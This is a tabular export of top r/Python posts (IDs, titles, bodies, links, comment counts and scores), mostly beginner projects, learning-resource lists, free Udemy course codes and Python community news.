bk287v,"He wasn’t happy about it, but Guido did take a picture with me",,https://i.redd.it/ean4vo9n4wv21.jpg,51,1065
dnrp3b,Pandas got a new logo,,https://i.redd.it/c6h7rok9c2v31.jpg,72,1064
h02kx4,Made a Tic Tac Toe game.,,https://v.redd.it/26g7dhhe10451,79,1063
jc5xkf,The Ultimate Python Resource hub - Curated list of useful resources for all Python beginners,,https://ayushirawat.com/the-ultimate-python-resource-hub,26,1059
g5gqg0,"I save all of my music on YouTube playlists and was really anoyed by all of the downloaders on the internet(Full of ads, not reliable...). So I've created a simple YouTube playlist downloader, it loads up all of the songs from the playlist and then downloads one by one in a MP4 format.",,https://v.redd.it/p5el9ot0n6u41,99,1065
gns9rb,Linear Regression using Gradient Descent (3 types),,https://v.redd.it/siwrrt01k2051,60,1060
8w5ra9,A REAL Python cheat sheet for beginners,,https://learnxinyminutes.com/docs/python3/,61,1052
nrvwuw,Thought I'd make a list of all the best ways to learn Python I found on the net and help the newbies.,"There are a lot of tutorials and sites claiming to be able to teach you Python in the best way but not all of them are as good as they look. So here I have tried to combine the most reputed and useful websites and tutorials I as per my knowledge.

&#x200B;

1. [Automate the Boring Stuff with Python](https://automatetheboringstuff.com/)  \- One of the most renowned and recommended books for complete beginners to programming. Suggested for newer and medium programmers equally.
2. [Official Documentation](https://docs.python.org/3/tutorial/) \- As said by many experienced programmers, the best way to learn any language is to go over the official documentation once. No tutorial can go over all the syntax and libraries in Python. So, for thorough understanding of Python, this is the way to go.
3. [FreeCodeCamp Tutorial](https://www.freecodecamp.org/learn/scientific-computing-with-python/python-for-everybody/introduction-why-program) \- This is one of the most popular sites with 300+ hours of experienced teaching for free along with a Course Completion Certificate which you can use for your CVV, all for free.
4. [SoloLearn Courses](https://www.sololearn.com/learning) \- This site is pretty basic and contains MCQ questions and a single programming question after one module. It has Python For Beginners, Python For Intermediates, Python Core and Python for Data Science. Overall recommended for beginners.
5. [FreeCodeCamp X Giraffe Academy](https://www.youtube.com/watch?v=rfscVS0vtbw&vl=en) \- One of the best one's out there to get a kick start with Python. Teaches you all the basic recommended Syntax and explains them well too, unlike other's doesn't just make you copy paste code.
6. [Telusko](https://www.youtube.com/playlist?list=PLsyeobzWxl7poL9JTVyndKe62ieoN-MZ3) \- Not as popular or renowned as the other tutorials recommended above, but still worth watching.
7. [Cheat Sheet](https://learnxinyminutes.com/docs/python/) \- Not exactly a tutorial, it's a cheat sheet with all the essential syntax and their explanations.
8. [Stack Overflow](https://stackoverflow.com/) \- This is also not a tutorial. This is a place where you can ask your questions regarding Python. But please, before asking questions on Reddit or Stack Overflow, check your code twice or thrice and then google it. Even after that, if you can't solve the problem, send your question on Reddit and/or Stack Overflow.

**None of the above tutorials and information is mine** and is the property of their respective owners. I have just made a list so as to help other users trying to learn Python.

If you think I have left any other important links, please tell me and I will be more that happy to add them. My discord: doughnut#3968.

Hope this helped!!

EDIT: A couple of users reminded me that a Python course on Udemy by the Author of Automate the Boring Stuff With Python is free for like the next 13 hours, so I thought it would be good to share the link here too: [Automate The Boring Stuff With Python - Free Udemy Course](https://www.udemy.com/course/automate/?couponCode=JUN2021FREE)

EDIT 2: Many other users are also recommending courses. I cannot guarantee the credibility of the resources given below but I think that they must be worth giving a try too. **I DO NOT RECCOMMEND TRYING MULTIPLE COURSES. ONLY PICK 1-2 COURSES AT A TIME. ALSO IT IS NOT NECCESSARY TO DO ALL OF THE COURSES PROVIDED.** I will try to add them below:

1. [User](https://www.reddit.com/user/TheStickyToaster/) \- [Learn Python The Hard Way](https://learnpythonthehardway.org/python3/)
2. [User](https://www.reddit.com/user/platypus_69/) \- [Scrimba](https://scrimba.com/learn/python#)
3. [User](https://www.reddit.com/user/Zeffonian/) \- [Python For Everybody](https://www.py4e.com/)
4. [User](https://www.reddit.com/user/flag_to_flag/) \- [Microsoft Course For Python Beginners](https://youtube.com/playlist?list=PLlrxD0HtieHhS8VzuMCfQD4uJ9yne1mE6)
5. [User](https://www.reddit.com/user/MissCuppypie2019/) \- [Fluent Python](https://www.oreilly.com/library/view/fluent-python/9781491946237/)
6. [User](https://www.reddit.com/user/chris676712/) \- [A comment below.](https://www.reddit.com/r/Python/comments/nrvwuw/thought_id_make_a_list_of_all_the_best_ways_to/h0k3hh5?utm_source=share&utm_medium=web2x&context=3)
7. [User](https://www.reddit.com/user/ASIC_SP/) \- [Think Python](https://greenteapress.com/wp/think-python-2e/)
8. [User](https://www.reddit.com/user/Potential_Loss6978) \- [Codevita](http://www.codevita.live/powershot)
9. \[ON POPULAR REQUEST BY MANY USERS\] - [Corey Schafer](https://www.youtube.com/user/schafer5)

I have tried to add all the links which I thought would be useful. Thank you all for your help!

I will not add anymore because I want this to be concise. Thank you again.

\---------------------------------------------------------------------------------------------------------------------------

ProTip - Listen to crab rave while programming to increase your productivity by 10x.",https://www.reddit.com/r/Python/comments/nrvwuw/thought_id_make_a_list_of_all_the_best_ways_to/,123,1056
mi2038,"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code APR2021FREE","https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: APR2021FREE

https://www.udemy.com/course/automate/?couponCode=APR2021FREE

This promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to APR2021FREE2 in three days.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid-2021. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with. Check out /r/ProgrammingBuddies",https://www.reddit.com/r/Python/comments/mi2038/automate_the_boring_stuff_with_python_online/,63,1054
g8yvzl,I made a python script to get details about a repository just from your terminal before cloning it. All the information are retrieved using the GitHub API.,,https://i.redd.it/up300faahcv41.gif,43,1050
n5aksy,Tensorflow Object Detection in 5 Hours with Python | Full Course with 3 Projects,,https://youtu.be/yqkISICHH-U,71,1053
ddc70w,Updated gravitational potential field simulation. [OC] Link for code: https://github.com/pnp-peeyush/2D-Grvitational-Field-Simulation,,https://v.redd.it/q0vbvoe1tkq31,128,1052
c2w6hc,"Alien invasion game developed using Python. Reference : Python Crash Course, 2nd Edition: A Hands-On, Project-Based Introduction to Programming",,https://v.redd.it/blxwttpyli531,86,1046
oylicw,Python has made my job boring,"# I'm going to just go out and say it...Python has made my job boring.  I am an engineer and do design and test work.  A lot of the work involves analyzing test data, looking at trends over temperature etc.  Before python (BP) this used to be a tedious time consuming tasks that would take weeks.  After python (AP), I can do the same tasks few lines of code in a matter of minutes, I can generate a full report of results (it takes other engineers literally days to weeks to generate the same sort of reports).  Obviously it took me a while to build up the libraries and stuff...I truly enjoy coding in python and not complaining...  Just wondering if other people are having the same experience.",https://www.reddit.com/r/Python/comments/oylicw/python_has_made_my_job_boring/,268,1043
apndyq,Here we go,,https://i.redd.it/sid03mbtc1g21.jpg,180,1042
nabhjm,Wednesday Daily Thread: Beginner questions,"New to Python and have questions? Use this thread to ask anything about Python, there are no bad questions!

This thread may be fairly low volume in replies, if you don't receive a response we recommend looking at r/LearnPython or joining the Python Discord server at [https://discord.gg/python](https://discord.gg/python) where you stand a better chance of receiving a response.",https://www.reddit.com/r/Python/comments/nabhjm/wednesday_daily_thread_beginner_questions/,145,1041
bh9q92,What a journey python had,,https://v.redd.it/c8g0cvj16eu21,92,1043
y38r6b,"New, free book from Al Sweigart: Python Programming Exercises, Gently Explained","Hello, I've released my new book ""Python Programming Exercises, Gently Explained"". You can read it for free at:

https://inventwithpython.com/pythongently

Description: Many books and websites have aggressive programming challenges for top coders. However, *Python Programming Exercises, Gently Explained* is for the rest of us. We want challenges that improve our coding skills, not leave us confused and discouraged. Other tutorials and books have taught you the basics of Python, but the 42 programming exercises in this book let you practice what you've learned. Selected for their simplicity, these programming problems include gentle explanations of the problem, the prerequisite coding concepts you’ll need to understand the solution, and helpful templates to put together the programs if you have trouble starting from scratch.

This is the perfect book for beginner and intermediate programmers who want to test their Python skills but aren’t ready to begin professional-level software development. You don’t need the frustration of being expected to create complex algorithms and computer science theory; you need a large set of programming challenges that meet you at your level, with gentle explanations.",https://www.reddit.com/r/Python/comments/y38r6b/new_free_book_from_al_sweigart_python_programming/,88,1047
ft7n1h,Automate the Boring Stuff with Python Udemy course free to sign up until April 7th.,"https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

[(EDIT: The HTML book is free online, but you can get the PDF/Kindle ebook of Automate the Boring Stuff with Python in this week's Humble Bundle in support of cornavirus relief (Direct Relief, International Rescue Committee, Doctors Without Borders, Partners In Health)](https://www.humblebundle.com/conquer-covid19-bundle)

You can also click this link or manually enter the code: APR2020FREE (on Saturday the code changes to APR2020FREE2)

https://www.udemy.com/course/automate/?couponCode=APR2020FREE

This promo code works until April 7th (I can't extend it past that). Sometimes it takes 30 minutes or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month.

You can also purchase the course at a discount using my code APR2020 or MAY2020 (or whatever month/year it is) or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $14 to $16. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, which means I don't get the credit for referral signups. Blerg.)

Frequently Asked Questions:

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is now available online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid- or late-2020. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with.",https://www.reddit.com/r/Python/comments/ft7n1h/automate_the_boring_stuff_with_python_udemy/,46,1036
jb4hb8,Automating Zoom with Python - automatically logs into one's meetings/classes on time,,https://sunilaleti.hashnode.dev/automating-zoom,75,1034
f5vmh6,I've made a sorting visualizer with python and matplotlib.,,https://v.redd.it/rkzqu9qhzph41,22,1040
5qflfv,"For anyone learning Python for data science, this an amazing resource--excellent book as free Jupyter notebooks",,https://github.com/jakevdp/PythonDataScienceHandbook,35,1032
b63ynr,I made a robot that learns using reinforcement learning in python!,,https://v.redd.it/d9lrrkk4pno21,68,1035
i8ceq4,Python module for Nudity Detection and Classification.,,https://github.com/notAI-tech/NudeNet,144,1033
c9f3ua,Drawing Replicator using Fourier Transform and Epicycles,,https://v.redd.it/dxvknqlssg831,54,1035
113cb77,"Intel Publishes Blazing Fast AVX-512 Sorting Library, Numpy Switching To It For 10~17x Faster Sorts",,https://www.phoronix.com/news/Intel-AVX-512-Quicksort-Numpy,80,1030
8yapie,Transfer of Power (Guido stepping down as BDFL),,https://www.mail-archive.com/python-committers@python.org/msg05628.html,473,1027
msskzd,[Code Release] We created a fully autonomous YouTube channel that uploads daily self-created Twitch gaming compilations. It was a 100-day experiment that is now over. We spend many hours documenting everything and are sharing our four repositories with this post. Enjoy!,"More information can be found in the README of each repository. Please make sure to give the project a star on GitHub if it is helpful to you in some way. Thanks!  


[https://github.com/ContentAutomation](https://github.com/ContentAutomation)",https://www.reddit.com/r/Python/comments/msskzd/code_release_we_created_a_fully_autonomous/,43,1026
e407b0,My first go at coding neural networks with Python. This is just running a simple training exercise which I'll use later - very excited!,,https://i.imgur.com/wUJIJxr.jpg,109,1022
lhm3pm,Python turns 30 this month😎," Python was **created** by Guido van Rossum, and first released on February 20, 1991.",https://www.reddit.com/r/Python/comments/lhm3pm/python_turns_30_this_month/,58,1024
jz0l14,I made a PlayStation 5 Bot,"After trying to get a PlayStation 5 for quite awhile, it seems impossible to buy one as scalpers are using bots to mass purchase them and then resell them at huge up charge. After being really irritated about this, I decided to create my own bot, which I’ll be releasing for free. No longer will scalpers get a huge advantage over everyday people. It’s time to fight fire with fire. The link below points at my GitHub which has the public repository and an easy way to install it on your computer. I’ll give more instructions on it later if there’s any confusion. HAPPY SHOPPING!!!!

[PlayStation Bot Repo](https://github.com/dkkocab/WebSiteBot_PS5)",https://www.reddit.com/r/Python/comments/jz0l14/i_made_a_playstation_5_bot/,158,1026
hjatkm,"I made a Python library for advanced Google News data mining: get news data by topics, geolocation, full-text search. Plus, clusters of similar topics",,https://v.redd.it/s3y76ihz59851,47,1024
9pfvll,Made a .jpg to .txt converter,,https://i.redd.it/gn5rqnn042t11.jpg,98,1024
csb8z5,Layers on layers on layers,,https://i.redd.it/4t2qgofmmbh31.png,33,1023
by1l2g,I've been teaching myself python and made a mandelbrot image generator.,,https://i.redd.it/sziiq2b4t0331.png,48,1023
7d128x,NumPy announces timeline for dropping Python 2 support,,https://github.com/numpy/numpy/blob/master/doc/neps/dropping-python2.7-proposal.rst,147,1016
x05859,"Unix Pioneer Brian Kernighan: if you could only use one language, choose Python",,https://thenewstack.io/unix-pioneer-brian-kernighan-still-loves-awk-after-all-these-years/,163,1023
rdhqyd,effbot has passed away.,,https://mail.python.org/archives/list/python-dev@python.org/thread/36Q5QBILL3QIFIA3KHNGFBNJQKXKN7SD/,52,1018
bbrhr4,They use python to produce black hole image,"3 years ago MIT grad student Katie Bouman led the creation of a new algorithm to produce the first-ever image of a black hole.

Today, that image was released.

https://twitter.com/SmithsonianChan/status/1115970184659910656

TED - Katie Bouman: How to take a picture of a black hole

https://www.youtube.com/watch?v=BIvezCVcsYs

software used python

https://github.com/achael/eht-imaging",https://www.reddit.com/r/Python/comments/bbrhr4/they_use_python_to_produce_black_hole_image/,95,1021
92zezn,The apocalypse,,https://i.redd.it/noqehs16bzc11.jpg,140,1020
e2xi4l,I created this website to visualize how emojis are used on Twitter. Is the 14/4/2016 peak related with Python? Link in comments,,https://i.redd.it/t48460q74f141.png,65,1020
kmf1x6,I [13 yo] made a folder automating script in python!!,"I have made this

[https://github.com/P-arag/folder-automation](https://github.com/P-arag/folder-automation)

script that scans your downloads folder and transfers the files in their respective folders, for example, if you download a cat.jpeg, it is instantly gonna transfer it to Pictures folder. Currently, it **works only in Linux**, but it should be pretty adaptable to mac and PC. It works **really well** and autonomously when I added it to the startup applications of Ubuntu",https://www.reddit.com/r/Python/comments/kmf1x6/i_13_yo_made_a_folder_automating_script_in_python/,92,1017
b8buj2,I made this figure in python as a masters student and it's still my favorite,,https://i.redd.it/2xos31ktvqp21.png,75,1014
d7ma3q,My first own program. Beginner,,https://i.redd.it/z4u8wq8103o31.png,108,1017
3p12ww,You can hire Guido as a tutor,,http://imgur.com/4EPvxJP,128,1020
am0opt,Made use of my Python knowledge professionally for the first time!,"I’m a mechanical engineer, but love learning new things. In the last few years, I’ve taken several edX courses on python, and loved learning about it. I generally just tinker around keeping the basics fresh, but recently I had an opportunity to speed up some data analysis at work, and was able to use python to do it!

As part of our testing, we generate some large csv files (generally 1-4 gb), which were a real pain in the ass to work with in excel. Using python and pandas, I wrote a short piece of code (200 lines) to parse our data, strip out the junk, and plot it into a presentable form. Now there are like 5 people using it on a regular basis!

This is a big deal for me so I wanted to share it. Even dumb mech e’s can use computers!

E: Wow! Thanks for the overwhelming support guys! Every single comment I saw was very positive and helpful, you all are awesome. ",https://www.reddit.com/r/Python/comments/am0opt/made_use_of_my_python_knowledge_professionally/,131,1014
srcg8m,10 Tools I Wish I Knew When I Started Working with Python,"An article with funny memes that explains tools like venvs, flake8, black, isort, pytest, commitizen, semantic-release, pre-commit hooks, and Github Actions and how they work together

[https://python.plainenglish.io/10-tools-to-help-claw-your-way-back-to-sanity-while-coding-python-df0af160c33e](https://python.plainenglish.io/10-tools-to-help-claw-your-way-back-to-sanity-while-coding-python-df0af160c33e)",https://www.reddit.com/r/Python/comments/srcg8m/10_tools_i_wish_i_knew_when_i_started_working/,113,1014
n9smh1,I wrote another Binance trading algo in Python. This one is able to analyse how volatile every coin on Binance is and place a trade when during a strong bullish movement,"Had a lot of fun with with one, and I'm happy to share the code with you guys.

So the algorithm is essentially listening to price changes in the last 5 minutes for all the coins on Binance. Once it detects that some coins have moved by more than 3% in the last 5 minutes, it takes this as a strong bullish signal and places a trade.

The algo is also able to store each bought coin in a local file and to track the performance of each trade placed so that it can perform stop loss and take profit actions and sell the coins that reach those thresholds.

Here's a more in-depth look at the bot parameters:

1. By default we’re only picking USDT pairs
2. We’re excluding Margin (like BTCDOWNUSDT) and Fiat pairs
3. The bot checks if the any coin has gone up by more than 3% in the last 5 minutes
4. The bot will buy 100 USDT of the most volatile coins on Binance
5. The bot will sell at 6% profit or 3% stop loss

Anyway, here's the source code if you're comfortable with Python:

[https://github.com/CyberPunkMetalHead/Binance-volatility-trading-bot](https://github.com/CyberPunkMetalHead/Binance-volatility-trading-bot)

In case you need more guidance but would like to try the bot out, I wrote step-by-step guide as well

[https://www.cryptomaton.org/2021/05/08/how-to-code-a-binance-trading-bot-that-detects-the-most-volatile-coins-on-binance/](https://www.cryptomaton.org/2021/05/08/how-to-code-a-binance-trading-bot-that-detects-the-most-volatile-coins-on-binance/)

Any feedback or ideas how to improve it are welcome! :)",https://www.reddit.com/r/Python/comments/n9smh1/i_wrote_another_binance_trading_algo_in_python/,136,1019
gstn6b,snakeware - a new Linux Distro with a fully Python userspace,"snakeware is a new Linux-based operating system with a fully Python userspace. Our window manager is based on pygame\_gui. We do not use X11, we draw directly to the framebuffer. We also do not use systemd or any of the other huge and typical GNU/Linux utilities, because they are very opaque and not fun for recreational programmers to contribute to.

Our distro boots directly into a Python environment, where you can then do whatever you want with your computer. It's being designed based on the spirit of the Commodore 64, which is primarily that computing should be simple and fun. snakeware is still early in development, but we would like to welcome more contributors as the project grows (both in the Python space and in the build/packaging process for the actual distro).

snakeware GitHub:  [https://github.com/joshiemoore/snakeware](https://github.com/joshiemoore/snakeware)

YouTube Demo:  [https://www.youtube.com/watch?v=Zy8NXuzBPhA](https://www.youtube.com/watch?v=Zy8NXuzBPhA)

Thanks for reading, I'd love to hear what you think!

edit - added a screenshot

https://preview.redd.it/bxqsh4lkop151.png?width=801&format=png&auto=webp&s=b31455342250cd6f7d7f071370498d57cec1f728",https://www.reddit.com/r/Python/comments/gstn6b/snakeware_a_new_linux_distro_with_a_fully_python/,115,1014
964qci,I wrote a script to display an image in terminal using ANSI codes,,https://i.imgur.com/gA3fIei.png,67,1015
10525zo,I scanned every package on PyPi and found 57 live AWS keys,,https://tomforb.es/i-scanned-every-package-on-pypi-and-found-57-live-aws-keys/,96,1015
uznn8f,A modern and customizable python UI-library based on Tkinter,,https://github.com/TomSchimansky/CustomTkinter,50,1008
9zkfk8,This advert for a java course uses an image of python code.,,https://i.redd.it/mrb6osbvvzz11.png,72,1016
xajs4w,Been learning Python for a month now and if you are on the fence on learning programming this post is for you.,"Im a 39 year old dude who never delved in programming but always felt curious about it. Finally asked my IT friends if they had to learn again what would they do and they said to start learning a language until you master it. Python was recommended to me.  
I got a new job the same time i started learning Python.

Came across a situation where i would need to use the scanner on 28 pages for each client and only 7 of those were important, the other 21 were terms and conditions. So i thought maybe python could help me do a program that would insert the other 21 pages everytime i would scan pages 1,2,3,4,16,18 and 19. Used PyPDF2, this saved me so much time its insane.

I was taking a online course to learn a few things but i couldnt wait to learn everything i needed to know to do this, so i started searching on my own what i could do to make this work on pdf files. My initial thought was that i would append the 7 pages into the 21 and then use some command and reorganize them. I was wrong, there was no command for that. I could however merge the pages in the order i wanted so it had the same result.

Started with version 1.0, a python script that executed that page arrangement if i had a certain named file in the same directory as the script. 9 versions later now its a compiled executable that works in a 28 and 6 page file, both of them, one of them or not at all with the proper response to every situation.   


Another problem risen in my job, sometimes the client document would have a wrong number and i would have to fill out 2 of those 7 pages that just had the client info. I would have to write with a pen on the sheet the client NAME,ID,FISCALNUMBER,ADDRESS,CITY,POSTALCODE,CELLPHONE,EMAIL and a 20 digit number. on both pages. So again i asked the almighty Python if something could be done that would make me save time. Also asked my Boss if those values could be inputed with a computer and he said yes. So now python asks for those inputs and writes them into the pdf and i just have to print those 2 pages saving me a LOT of time.

Never did find a better way to do this other than using reportlab. However the text i added was vertical in an horizontal page. I just rotated the canvas 270º and its working.  


All of this just to say that starting to learn Python in a new job where i would need to use it to save time made me more motivated to learn it.

TLDR: Total noob used a little knowledge from an online course and googling skills to get 2 programs to help him do his job faster so he can slack more time, also its my cake day, thanks for coming to my ted talk.",https://www.reddit.com/r/Python/comments/xajs4w/been_learning_python_for_a_month_now_and_if_you/,89,1013
6dtp3d,SMS Spoofing with Python for Good and Evil,,http://www.thedurkweb.com/sms-spoofing-with-python-for-good-and-evil/,57,1012
k3tmw9,Python script that helps you study almost any language for FREE,"Hello everyone.

I wrote a python script that can help anyone who wants to study a foreign language to get full language courses for various levels for FREE.

The script is a scraper I wrote since I wanted to save some courses and material from Japanesepod101 to listen to on my phone, but I ended up making it global for almost any language.

Few points regarding the script:

1. I've noticed there are some other similar scrapers that rely on selenium but they are buggy and fragile. I like selenium as a tool, but I find it often times unnecessarily misused when simple POST/GET requests could get the same job done more eloquently, that's why I went with beautifulSoup.
2. Currently the script is only downloading mp3s (since that's what I originally intended to do) but I  plan on adding PDF/Video downloading in the future as well.

Any feedback is appreciated! :)

[https://github.com/nedlir/languagepod101-scraper](https://github.com/nedlir/languagepod101-scraper)",https://www.reddit.com/r/Python/comments/k3tmw9/python_script_that_helps_you_study_almost_any/,47,1005
dzptly,A Python program that lets you set the Windows desktop wallpaper to a video!,,https://v.redd.it/hjlmsqmir3041,99,1008
lyg74t,"Complete Python Course (~5 Hours, Free)","Hi there **👋**

I created a [complete Python course](https://youtu.be/t8pPdKYpowI), which I think could be interesting for some of you! 😊

&#x200B;

The topics I cover in the course:

# 📚 OVERVIEW 📚

* Introduction to Python
* Installation and Setup Local Development Environment
* Write our first Python program
* Python IDE vs simple File Editor
* Strings and Number Data Types
* Variables
* Encapsulate Logic with Functions
* Accepting User Input
* Conditionals (if / else) and Boolean Data Type
* Error Handling with Try / Except
* While Loops
* Lists and For Loops
* Comments in Python
* Sets
* Built-In Functions
* Dictionary Data Type
* Modularize your project with Modules
* Project: Countdown App
* Packages, PyPI and pip
* Project: Automation with Python (Working with Spreadsheets)
* Object Oriented Programming: Classes and Objects
* Project: API Request to GitLab

&#x200B;

Appreciate any feedback and hope the content is valuable for some of you 😊",https://www.reddit.com/r/Python/comments/lyg74t/complete_python_course_5_hours_free/,42,1007
xlgo4a,I wrote my first real scripts today,"I’m a water resource engineer by trade, learning to code partially for fun and partially in the hopes of making my job easier. Today I needed to convert a whole bunch of files from one format to another, edit some particular values in the header, and convert to a third format. Rather than spend all day doing it by hand, I spent all day writing a script that does it in seconds…and it works!

It’s a piddling little script, only about 50 lines, but it does exactly what I want it to do, and now in the future when I have to deal with this process again, I’ll be armed and ready. 

I know this is nothing revolutionary, but honestly it feels pretty good to write working code to address a real life problem! Hopefully the next one goes a bit faster…",https://www.reddit.com/r/Python/comments/xlgo4a/i_wrote_my_first_real_scripts_today/,119,1010
ur9t92,Python 3.10 Match statements are 86% faster than If statements,,https://twitter.com/anthonypjshaw/status/1526034155448184832?s=21&t=r9ADTOqs_C0DP_RraR97Pg,97,1003
fbq7ej,I wrote a deep RL agent using Python and Tensorflow 2 that can play a perfect game of snake (6x6 grid),,https://v.redd.it/4rc2iqw5a0k41,25,1001
ilp6py,Facial Detection with python in just 2 mims [tutorial],,https://youtu.be/LdMFdGo6O1E,63,1005
eo3pzd,A* path finding algorithm visualizer written in pygame - https://github.com/mHaisham/Steruell,,https://v.redd.it/0ybky6bzkja41,48,1008
hy1wxg,Looking for a Python subreddit for non-beginners,"I'm on a bunch of programming language subreddits.  The quality is surprisingly high.  /r/cpp for example regularly kicks my ass.  There are probably thirty posters there I regularly interact with.  There are representatives from the teams of all the three major C++ compilers there!

But r/Python is a vast wasteland.  All the most upvoted posts are people's beginner projects, which get thousands of upvotes and dozens of comments.  Actual articles about Python language features get almost no attention.  And I never recognize anyone, even though I've been on this subreddit for many years - it's like people write their first Python program, post it here, and then leave.

As far as i know, there is no one on here who actually contributes to the Python language.  Why would they be here?  What value would this offer to them?

I'm sadly finding /r/learnpython to be more interesting than r/Python and am spending my time there.  At least I can help people out.

But there has to be somewhere for Python programmers who aren't beginners anymore.  Where is that place?",https://www.reddit.com/r/Python/comments/hy1wxg/looking_for_a_python_subreddit_for_nonbeginners/,182,1001
rofw96,You can now make Python desktop apps with HTML and CSS?,"Yup you read that right. A project named Neutron ([https://github.com/IanTerzo/Neutron](https://github.com/IanTerzo/Neutron)) now gives the ability to create desktop apps with HTML and CSS. The workflow is very similar to how it is building a website, except that you use python instead of JavaScript, and that you build an app. And it's all native. The window is actually a browser, similar to how Electron does it. The best part is that you have full access to the DOM as you would in JavaScript, with basically no latency. The only problem right now is that it takes 2 - 4 seconds to fully load an app, but this is resolved by implementing a loading window. Similar to how Discord does it, which is also built on Electron btw.

    import Neutron
    
    win = Neutron.Window(""Example"", size=(600,100), css=""def.css"")
    win.display(file=""render.html"")
    
    def onClick():
      win.getElementById(""title"").innerHTML = ""Hello:"" + win.getElementById(""inputName"").value
    
    win.getElementById(""submitName"").AddEventListener(""click"", Neutron.event(onClick))
    
    
    win.show()

From [main.py](https://github.com/IanTerzo/Neutron/blob/main/TEMPLATE/main.py) in Neutron's GitHub.",https://www.reddit.com/r/Python/comments/rofw96/you_can_now_make_python_desktop_apps_with_html/,191,998
khajql,I made a little script to download playlist from Spotify,"Hey guys, I made this little script that takes any Spotify playlist, list all the tracks, search each of them on YouTube and download them in mp3. About 2 years ago I used a tool to do that, but apparently it was deleted, and the other alternatives out there you need to pay to use it so I made my own. Hope it can be useful for someone.

Link: [https://github.com/norbeyandresg/hades](https://github.com/norbeyandresg/hades)

Edit: thanks you all for the incredible support, I’ll checking the little issues and make some improvements to the script. 

For the interested, I’m currently paying and using Spotify premium though :)",https://www.reddit.com/r/Python/comments/khajql/i_made_a_little_script_to_download_playlist_from/,144,996
veklmy,Is there possible interest in a youtube series on building a python desktop program?,"I am interested in doing a youtube series on python.  I know there are already a lot of talented youtubers covering learning python.  I want to show how to create a python desktop application from the ground up.  It will cover specifics, not generalities and share all source code.  Here are some of the topics I plan to cover.

* focusing on Windows development, but most will port readily to linux and mac
* installing python
* sublime text editor, customizing and integrating for python
* automation scripts to aid running and building python integrated into sublime
* using pyinstaller to build executable, so you can distribute code without python
* Qt5 for building a GUI for you desktop app and using QtDesigner
* Integrating SQL database into your application (SQLite)
* my source code search for code reuse
* the target program will be a wristwatch database for my watch collection
* I will be sharing all source code
* specifics, not generalities

This will not be a ""learn how to program"" series.  The focus will be on demonstrating steps needed to build such an application.  Repurposing this watch database for your own database application would be straight forward.

Note:  There's more than one way to skin a cat .  I will simply be showing how I do it and it may or may not be the best way for you.

Any feedback regarding my plan is greatly appreciated.",https://www.reddit.com/r/Python/comments/veklmy/is_there_possible_interest_in_a_youtube_series_on/,190,1001
pnzh50,Datasette Desktop 0.2.0: The annotated release notes,,https://simonwillison.net/2021/Sep/13/datasette-desktop-2/,9,1000
cyslju,"AI Cheatsheets - Now learn Tensorflow, Keras, Pytorch, Dask, Pandas, Numpy, Scipy, Pyspark, R Studio, Matplotlib and many more in an interactive manner",,http://www.aicheatsheets.com/,67,1001
jp0x4d,Taking a dictionary as an argument is the root of all evil,"Both at my current company and in an open-source project I'm working on, I keep seeing the same heinous anti-pattern everywhere I look:  
```
def foo(params):
    why_wasnt_this_an_argument = params['why_wasnt_this_an_argument']
    # do something
    print('kill me')
```
